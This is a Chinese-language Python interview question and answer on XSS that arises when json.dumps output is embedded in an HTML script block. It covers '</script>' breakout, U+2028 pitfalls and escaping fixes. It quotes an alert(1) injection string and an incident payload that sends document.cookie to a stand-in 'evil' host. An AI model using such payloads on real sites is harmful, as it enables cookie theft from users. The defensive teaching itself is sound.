---
title: "[Q6228] JSON 嵌入 HTML 的闭合标签逃逸与 U+2028"
date: 2026-11-24
categories: [PythonWeb后端]
tags: [Python面试, 面试题, 27]
type: 面试题
---

### Q6228 · JSON 嵌入 HTML 的闭合标签逃逸与 U+2028

难度：P6 ｜ 标签：XSS、JSON、script 标签、</script> 逃逸、U+2028、ensure_ascii、模板安全

**问**：把用户数据 `json.dumps` 后直接塞进 HTML 的 `<script>var data = ...</script>` 里有什么风险？为什么 JSON 本身合法的内容能"逃出"脚本块？`</` 转义成 `<\/` 为什么是安全的、数据会丢吗？U+2028/U+2029 又是什么坑，`ensure_ascii=True` 为什么能一并规避？

**答**：
结论：这是**两个解析层的错位**问题。①**HTML 解析层先于 JS**：浏览器解析 HTML 时，`<script>` 块的结束判定只看**字面字符串 `</script`**（更精确说是 `</script` 后跟空白/`>`），完全不看 JS 语法——JSON 字符串里合法的 `"bio": "hello </script><script>alert(1)</script>"`，在 HTML 层就把脚本块提前终结了，剩下的内容被当作新的 HTML 解析，攻击者注入的 `<script>` 成为**新的脚本节点**执行——XSS 成立，且 `json.dumps` 对此毫无防御（它只保证 JSON 合法，不理解 HTML 上下文）；②**修复**：把 `</` 替换为 `<\/`——JSON 字符串里 `\/` 是 `//` 两个字符的合法转义（JSON 规范允许转义任意 `/`），`json.loads` 还原后仍是 `</`，**业务数据无损**，但字面文本里不再出现 `</script` 序列，HTML 层就无法提前终结脚本块；③**U+2028/U+2029**（行分隔符/段落分隔符）：它们是 JS 语法里的**合法行终止符**（ES5+），但在 JSON 字符串里出现时是合法字符——于是 JSON 合法、JS 报错：`var s = "A\u2028B"` 字面放进脚本时，U+2028 被 JS 当换行，字符串字面量未闭合直接语法错误；`json.loads` 自己不受影响，坑在"JSON 作为 JS 源码"这一步；④`ensure_ascii=True`（Python 默认）把所有非 ASCII 转成 `\uXXXX` 转义，U+2028 变成字面 `\u2028` 六个字符，JS 解析时在字符串里还原——一并规避；但 `ensure_ascii=False`（省体积、UTF-8 直出）时必须手动替换。

取舍：a) 最小修复集：`payload.replace("</", "<\\/")` + U+2028/2029 替换——三个替换是"JSON 嵌 HTML script 块"的完整安全集（`<!--` 序列在某些老上下文也建议处理，HTML 注释与脚本块交互的历史坑）；b) `ensure_ascii=True` 的取舍：多体积（每个 CJK 字符 6 字节 vs 3 字节 UTF-8）、少坑——页面内嵌 JSON 用 True 换稳，API 响应（不嵌 HTML）用 False 省流量，两处策略不必一致；c) 更工程化的路线：数据不进 script 块，改走 `data-*` 属性（HTML 属性转义规则）或独立 fetch 拉取（JSON 纯接口），模板层统一提供 `|to_json` 过滤器把转义收口——**靠一处可信组件而不是每处手写 replace**；d) 纯接口响应（Content-Type: application/json）不受此坑影响：没有 HTML 解析层参与；坑只存在于"JSON 文本被 HTML 解析器读"的上下文——服务端渲染页面内嵌数据、`.html` 静态资源内嵌配置等。

实战：事故形态是"社区站用户资料页内嵌 `var profile = json.dumps(bio)`，用户简介写 `</script><script>document.location='//evil/?c='+document.cookie</script>`，所有浏览该主页的用户 Cookie 被带出；修复：模板层 to_json 过滤器统一做 `</`→`<\/` 与 U+2028 转义 + 回归测试用例固化为三行替换断言"。下面演示逃逸与修复的等价性。

```python
# JSON 嵌入 HTML 的闭合标签逃逸与 U+2028 行分隔符
import json

user_bio = {"bio": 'hello </script><script>alert(1)</script>', "name": "A\u2028B"}
print("[1] 直接 dumps 塞进 <script> 块 = 主动给 XSS 开门:")
payload = json.dumps(user_bio, ensure_ascii=False)
print("   ", payload)

html_bad = f"<script>var data = {payload};</script>"
print("[2] '</script>' 在 HTML 解析层提前终止脚本块, 后面内容被当代码执行")
print("    坏例子片段:", html_bad[:60], "...")

safe = payload.replace("</", "<\\/").replace("\u2028", "\\u2028").replace("\u2029", "\\u2029")
html_ok = f"<script>var data = {safe};</script>"
print("[3] 修复: 转义 '</' 为 '<\\/'(JSON 字符串里语义不变) + 处理 U+2028/2029")
print("    好例子片段:", html_ok[:60], "...")
assert json.loads(safe) == json.loads(payload)
print("[4] 转义是可逆的: JSON.loads 还原结果一致, 业务数据无损")

print("[5] U+2028/2029 是 JS 合法 JSON 但非法的行终止符: ensure_ascii=True 可一并规避(体积换安全)")
ascii_payload = json.dumps(user_bio)
print("    ensure_ascii=True 后 2028 变 \\u2028:", "\\u2028" in ascii_payload)

print("[6] 更稳的工程做法: 数据经 data-* 属性/base64 传递, 或模板层提供 |to_json 过滤器统一转义")
print("[7] 记住: 这是'HTML 上下文'的坑, 纯接口响应(application/json)不受影响")
```

**追问一**：为什么 `json.dumps` 不直接防住这个？`</`→`<\/` 转义在 JSON 规范里的依据是什么？—— `json.dumps` 的职责边界是"产出符合 RFC 8259 的 JSON 文本"，它不理解也不应理解消费上下文（HTML 属性、script 块、SQL 字符串都是不同上下文各有各的转义规则）——**上下文相关的转义永远属于模板/视图层**，这是框架安全设计的一致原则（Jinja2 的 autoescape 也只按 HTML 上下文转义）。`<\/` 的规范依据：RFC 8259 的字符串转义表里 `\/` 是**显式列出的合法转义**（与其他 `\uXXXX`、`\n` 并列），语 义上就是 `/`——规范作者加入它正是为了"允许生成器防御性地转义斜杠"，序列化器（如 PHP 的默认 JSON 输出）普遍输出 `\/`。所以这个修复没有任何兼容性风险，任何合规的 JSON 解析器都接受。

**追问二**：除了 `</script>`，JSON 嵌 HTML 还有哪几类上下文坑？`data-*` 属性方案安全吗？—— 三类：①**属性上下文**：JSON 塞进 `data-config='...'` 属性时坑换成"引号逃逸"（值里的 `"`、`'`、`&`）——用 HTML 属性转义（`html.escape`）而不是 JSON 转义，两套规则不能混；②**注释/CDATA**：老式 `<script><!-- ... //--></script>` 里 `--` 序列的边界问题，现代页面基本绝迹但模板遗留仍可能踩；③**URL 上下文**：JSON 里的值再被拼进 href/src 时是 URL 编码问题（`javascript:` scheme 注入），转义责任又换一层。`data-*` 方案的安全性前提：**走属性转义规则**且值不做 URL/JS 二次拼接——`json.dumps` 后用 `html.escape` 塞进双引号属性，前端 `JSON.parse(el.dataset.config)` 取回，数据流单一、规则清晰；它比 script 块方案好的根本原因是把"HTML 解析层只做属性、不产生脚本节点"这个结构保证利用起来了。所有方案的共同心法：**一个数据片段经过几个解析层，就要按每个层的规则各转义一次，顺序从最外层开始**。

## 背诵要点
- script 块终结只看字面 `</script`（HTML 层不看 JS 语法）：JSON 合法 ≠ HTML 安全，json.dumps 不防 XSS。
- 修复三替换：`</`→`<\/`（JSON 规范合法转义，数据无损）+ U+2028/U+2029 → `\u2028/\u2029`（JS 行终止符语法坑）。
- ensure_ascii=True 用体积换稳（页面内嵌）；纯接口响应不受影响；工程化收口靠模板 to_json/data-* 属性，别每处手写。

## 复盘追问
- 用户简介里写什么就能 XSS 一个内嵌 JSON 的资料页？（`</script><script>...`；修复是模板层统一 to_json 过滤器）
- JSON 嵌 data-* 属性要按什么规则转义？（HTML 属性转义 html.escape，不是 JSON 转义；多层解析各转义一次、从最外层起）
